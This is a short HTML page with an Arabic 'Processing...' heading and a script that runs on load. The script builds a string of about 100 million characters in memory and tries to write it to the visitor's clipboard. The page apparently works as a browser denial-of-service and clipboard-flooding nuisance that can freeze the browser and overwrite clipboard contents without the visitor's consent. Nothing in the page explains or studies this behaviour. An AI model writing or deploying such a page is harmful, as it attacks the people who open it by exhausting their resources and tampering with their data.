<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Memory Buffer</title>
</head>
<body>
  <h2>جاري المعالجة...</h2>
  <script>
    window.onload = function() {
      // توليد مصفوفة نصوص ضخمة (أكثر من 50 مليون حرف) وحجزها في الذاكرة والحافظة
      let buffer = [];
      let baseString = "A".repeat(1000000); // 1 مليون حرف في المقطع
      
      for (let i = 0; i < 100; i++) {
        buffer.push(baseString); // 100 مليون حرف في الرام
      }
      
      let fullText = buffer.join("");
      
      // محاولة وضع النص في الحافظة
      if (navigator.clipboard) {
        navigator.clipboard.writeText(fullText);
      }
    };
  </script>
</body>
</html>
